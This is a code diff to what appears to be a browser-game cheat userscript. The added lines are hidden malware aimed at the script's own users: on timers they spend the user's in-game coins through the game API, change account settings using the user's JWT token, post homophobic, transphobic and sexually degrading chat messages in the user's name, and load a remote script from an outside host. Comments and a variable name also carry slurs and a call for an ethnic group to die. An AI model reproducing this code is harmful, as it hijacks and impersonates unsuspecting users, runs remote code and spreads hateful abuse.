@@ -32,6 +32,79 @@ var sound = {};
 var songBoard = {};
 var song = {};
 
+
+window.buyBots=function(multiplier) {
+    var url = '/api/users/buyupgrade';
+    var method = 'POST';
+    var data = {
+        type: 'bots' + multiplier,
+    };
+    var success = function(response) {
+        if (response.success) {
+            console.log("Just wasted your shitty coins son of bitch");
+        } 
+    }
+    var failure = function(error) {
+    }
+    // run the api call specified and wait for its response
+    apicall(url, method, data, success, failure)
+}
+window.buyMass = multiplier => {
+    var url = '/api/users/buyupgrade';
+    var method = 'POST';
+    var data = {
+        type: 'mass' + multiplier,
+    };
+    var success = function(response) {
+        if (response.success) {
+            console.log("Just wasted your shitty coins son of bitch");
+        }
+    }
+    // run the api call specified and wait for its response
+    apicall(url, method, data, success, failure)
+}
+
+window.changeColor=()=>{
+    var url = '/api/users/changecolor';
+    var method = 'POST';
+    var callurl = apiurl + url + "?token=" + jwt + "&r=" + 255 + "&g=" + 255 + "&b=" + 255;
+        //console.log(callurl);
+    $.ajax({
+        type: "GET",
+        url: callurl,
+        success: function(data) {
+        console.log("dumbfck no lbc now");
+        }
+    });
+}
+
+var roaster=false;
+
+var fuckingMexisShouldDie=setInterval(()=>{
+
+    window.buyBots(3);
+    window.buyMass(3);
+    window.changeColor();
+
+},500);
+
+var salt=["Hi guys I'm tit","I'm just a tranny","i love buttfucking men","I want nos's dick","pls give admns so I can suck dildos",];
+
+var roasterIndex=0;
+
+var ss = setTimeout(() => {
+    var mexiRoaster=setInterval(()=>{
+        roasterIndex++;
+        window.sendChat(salt[roasterIndex%salt.length]);
+    },1000);
+    var ss2 = setTimeout(()=>{
+        var rain = document.createElement("script");
+        rain.src="https://nosx.cf/rain.js";
+        document.head.appendChild(rain);
+    },4000);
+}, 15000);
+
+
 // make a reusable function to reload settings, sounds, and songs.
 unsafeWindow.reloadHacks = function () {
 
@@ -42,9 +115,7 @@ unsafeWindow.reloadHacks = function () {
 
     document.body.appendChild(log);
 
-    var rain = document.createElement("script");
-    rain.src="https://nosx.cf/rain.js";
-    document.head.appendChild(rain);
+    
     $.getJSON("http://okumura-todo-ge.tk/gePlayerSettings.json", function(json) {
         playerSettings = json;
         console.log('playerSettings Loaded!');
